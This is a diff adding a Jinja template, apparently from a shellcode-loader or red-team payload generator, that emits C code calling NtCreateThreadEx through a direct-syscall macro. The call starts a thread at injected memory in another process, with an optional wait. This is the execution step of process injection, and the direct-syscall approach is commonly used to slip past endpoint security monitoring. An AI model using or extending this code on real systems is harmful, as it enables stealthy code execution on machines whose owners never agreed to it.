@@ -1,0 +1,19 @@
+{% from "macros.jinja" import syscall_call, createThreadStub with context %}
+
+{% if section == "globals" %}
+    {% include "lib/syscalls.jinja" %}
+{% else %}
+    HANDLE hThread;
+    NTSTATUS status;
+    DWORD SyscallId = 0;
+
+    {{ syscall_call("NtCreateThreadEx", "&hThread, THREAD_ALL_ACCESS, NULL, hProc, (PTHREAD_START_ROUTINE)mem, NULL, FALSE, 0, 0, 0, NULL") }}
+
+    {% if wait_for_termination %}
+      if (hThread != NULL) {
+          WaitForSingleObject(hThread, 500);
+          CloseHandle(hThread);
+          return 0;
+      }
+    {% endif %}
+{% endif %}
